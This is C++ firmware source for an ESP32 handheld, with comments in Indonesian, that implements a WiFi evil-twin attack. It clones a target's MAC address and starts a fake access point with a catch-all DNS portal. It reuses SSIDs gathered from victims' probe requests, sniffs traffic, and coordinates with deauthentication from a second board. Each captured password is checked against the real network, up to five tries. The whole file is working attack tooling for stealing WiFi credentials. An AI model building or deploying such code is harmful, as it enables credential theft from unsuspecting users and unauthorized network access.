#include "evil_twin.h"

#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>
#include <DNSServer.h>

#include "tft_compat.h"
#include "state_machine.h"
#include "ui_helpers.h"
#include "ui_screens.h"
#include "board_hal.h"
#include "attack_engine.h"
#include "attack_control.h"
#include "tx_count.h"
#include "wifi_state.h"
#include "config_store.h"
#include "karma.h"

// Shared state yang tetap didefinisikan di main.cpp.
extern WebServer server;
extern DNSServer dnsServer;
extern String targetSSID;
extern bool useCustomTemplate;
extern bool transientActive;
extern unsigned long transientUntil;
extern uint8_t transientMode;
extern int templateSelection;

const byte DNS_PORT = 53;

// State Evil Twin (dipindah dari main.cpp).
unsigned long evilTwinStartTime = 0;
bool g_evilTwinCoop = false;
bool isEvilTwinRunning = false;
int evilTwinModeSelection = 0;
String capturedEmail = "";
String capturedPass = "";
bool isReleasing = false;
bool isVerifying = false;
bool verificationResult = false;
unsigned long releaseTimer = 0;
unsigned long verifyStart = 0;
int verifyState = 0;
int verifyAttempts = 0;
unsigned long releaseAfterSuccess = 0;

String getBestDiscoveredSSID() {
  String best = "";
  int bestCount = 0;

  portENTER_CRITICAL(&g_probeLogMux);
  for (int i = 0; i < g_probeLogCount; i++) {
    int idx = (g_probeLogHead - g_probeLogCount + i + PROBE_LOG_SIZE) % PROBE_LOG_SIZE;
    if (g_probeLog[idx].ssid[0] != 0 && (int)g_probeLog[idx].count > bestCount) {
      best = String(g_probeLog[idx].ssid);
      bestCount = g_probeLog[idx].count;
    }
  }
  portEXIT_CRITICAL(&g_probeLogMux);

  for (int i = 0; i < g_karmaSSIDCount; i++) {
    if (g_karmaSSIDs[i].ssid[0] != 0 && (int)g_karmaSSIDs[i].probeCount > bestCount) {
      best = String(g_karmaSSIDs[i].ssid);
      bestCount = g_karmaSSIDs[i].probeCount;
    }
  }
  return best;
}

void startEvilTwinWithDeauth() {
  radioSetMode(RADIO_AP_STA);
  delay(100);
  // Clone BSSID target agar AP palsu benar-benar "twin" (bukan MAC original).
  // Mode CO-OP (2 board): JANGAN clone MAC, supaya deauth dari board jammer
  // tidak ikut memutus korban yang sudah terhubung ke AP palsu ini.
  if (!g_evilTwinCoop) {
    if (g_targetBSSID[0] != 0 || g_targetBSSID[1] != 0 || g_targetBSSID[2] != 0 ||
        g_targetBSSID[3] != 0 || g_targetBSSID[4] != 0 || g_targetBSSID[5] != 0) {
      esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, g_targetBSSID);
      if (macErr != ESP_OK) {
        Serial.printf("[WARN] clone MAC target gagal (%d), pakai MAC existing\n", macErr);
      }
      delay(50);
    }
  } else {
    restoreOriginalApMac();
    Serial.println("[EVIL TWIN] Mode CO-OP 2 BOARD: pakai MAC sendiri, tanpa deauth internal");
  }

  String safeSSID = targetSSID;
  if (safeSSID.length() == 0) {
    safeSSID = getBestDiscoveredSSID();
    if (safeSSID.length() == 0) {
      safeSSID = "Free_WiFi";
    } else {
      Serial.printf("[EVIL TWIN] SSID hidden -> pakai hasil Probe/Karma: %s\n", safeSSID.c_str());
    }
  }

  bool apSuccess = WiFi.softAP(safeSSID.c_str(), NULL, g_targetChannel, 0, 4);
  if (!apSuccess) {
    Serial.println("[ERROR] Gagal membuat AP Palsu!");
    stopEvilTwin();
    currentState = MAIN_MENU;
    drawMainMenu();
    return;
  }
  delay(250);

  uint8_t fakeMac[6];
  esp_wifi_get_mac(WIFI_IF_AP, fakeMac);
  Serial.printf("[EVIL TWIN] Fake AP: SSID=%s MAC=%02X:%02X:%02X:%02X:%02X:%02X ch=%d\n",
                safeSSID.c_str(),
                fakeMac[0], fakeMac[1], fakeMac[2], fakeMac[3], fakeMac[4], fakeMac[5],
                g_targetChannel);

  IPAddress IP = WiFi.softAPIP();
  dnsServer.start(DNS_PORT, "*", IP);
  server.begin();

  applyPromiscuousFilter(false);
  esp_wifi_set_promiscuous_rx_cb(packetSniffer_cb);
  esp_wifi_set_promiscuous(true);

  resetPacketCounters();
  setVictimFound(false);
  isReleasing = false;
  isVerifying = false;
  isEvilTwinRunning = true;
  setAttackMode(ATK_EVIL_TWIN);
  evilTwinStartTime = millis();

  Serial.printf("Evil Twin Started. Target BSSID=%02X:%02X:%02X:%02X:%02X:%02X ch=%d (attempt %d/%d)\n",
                g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
                g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5],
                g_targetChannel,
                verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
}

void stopEvilTwin() {
  isEvilTwinRunning = false;
  isReleasing = false;
  isVerifying = false;
  verifyState = 0;
  useCustomTemplate = false;
  setAttackMode(ATK_IDLE);
  server.stop();
  dnsServer.stop();
  resetWifiStateAfterAttack();
}

void beginVerification() {
  isReleasing = false;
  isVerifying = true;
  verifyState = 1;
  verifyStart = millis();
  Serial.printf("[VERIFY] Attempt %d/%d starting\n",
                verifyAttempts + 1, MAX_VERIFY_ATTEMPTS);
  esp_wifi_set_promiscuous(false);
  setAttackMode(ATK_IDLE);
  WiFi.disconnect();
  delay(100);
  WiFi.begin(targetSSID.c_str(), capturedPass.c_str(), g_targetChannel, g_targetBSSID);
}

void updateVerification() {
  if (!isVerifying) return;

  if (WiFi.status() == WL_CONNECTED) {
    verificationResult = true;
    WiFi.disconnect();
    updatePasswordVerification(true);
    isVerifying = false;
    verifyAttempts = 0;
    verifyState = 2;
    releaseAfterSuccess = millis() + SUCCESS_HOLD_MS;
    Serial.println("[VERIFY] PASSWORD BENAR");
    return;
  }

  if (millis() - verifyStart > VERIFY_TIMEOUT_MS) {
    WiFi.disconnect();
    updatePasswordVerification(false);
    isVerifying = false;
    verifyAttempts++;

    Serial.printf("[VERIFY] Attempt %d/%d FAILED\n",
                  verifyAttempts, MAX_VERIFY_ATTEMPTS);

    if (verifyAttempts >= MAX_VERIFY_ATTEMPTS) {
      verifyState = 0;
      verifyAttempts = 0;
      stopEvilTwin();
      tft.fillScreen(TFT_BLACK);
      drawHeader("MAX PERCOBAAN", TFT_RED);
      tft.setTextFont(2); tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.setCursor(10, 40); tft.println("5x password salah.");
      tft.setCursor(10, 60); tft.println("Target dilepas.");
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.setCursor(10, 85); tft.println("Kembali ke menu...");
      transientActive = true;
      transientUntil = millis() + 2500;
      transientMode = 1;
      return;
    }

    verifyState = 3;
    isReleasing = false;
    esp_wifi_set_promiscuous(true);
    setAttackMode(ATK_EVIL_TWIN);

    tft.fillScreen(TFT_BLACK);
    drawHeader("PASSWORD SALAH", TFT_RED);
    tft.setTextFont(2); tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setCursor(10, 40); tft.println("Password salah.");
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.setCursor(10, 62);
    tft.print("Percobaan: "); tft.print(verifyAttempts);
    tft.print("/"); tft.println(MAX_VERIFY_ATTEMPTS);
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.setCursor(10, 85); tft.println("Target input ulang...");
    transientActive = true;
    transientUntil = millis() + 1500;
    transientMode = 2;
    return;
  }
}

void handleEvilTwinModeSelect() {
  if (btnTopPressed()) {
    delay(200);
    evilTwinModeSelection = (evilTwinModeSelection + 1) % 2;
    drawEvilTwinModeSelect();
  }
  if (btnBottomPressed()) {
    delay(200);
    g_evilTwinCoop = (evilTwinModeSelection == 1);
    currentState = TEMPLATE_SELECT;
    templateSelection = 0;
    drawTemplateSelect();
  }
}
